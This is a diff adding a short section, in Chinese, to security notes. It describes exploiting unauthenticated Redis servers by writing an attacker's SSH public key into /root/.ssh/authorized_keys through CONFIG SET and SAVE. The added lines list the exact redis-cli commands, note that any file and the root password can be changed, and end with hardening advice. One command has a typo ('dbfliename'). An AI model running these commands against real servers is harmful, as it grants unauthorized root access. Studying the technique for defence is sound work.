@@ -144,3 +144,15 @@
 
 ## 利用redis-cli攻击服务器
 [Redis 未授权访问漏洞深度利用](https://blog.csdn.net/qq_27446553/article/details/78096385)
+### 利用漏洞ssh免密连接
+1. redis-cli连接到服务器的redis
+2. 查看redis的信息：info server
+3. 查看redis所有配置：config get *
+4. 修改redis工作目录：config set dir /root/.ssh
+5. 修改redis数据存储目录：config set dbfliename authorized_keys
+6. 将ssh的公钥放入authorized_keys文件：set 0 '\n\n\n公钥\n\n\n'
+7. 保存：save
+8. 回复redis原本配置
+9. 这个方法利用redis的无授权访问漏洞，凭借这个方法可以写linux上的所有文件，但是无法读。
+10. 也可以借此修改服务器的root密码
+11. 所以要做好安全防护，如：开启redis的保护模式，设置密码，限制访问ip。linux禁止root登陆，管理员锁定账号等等。
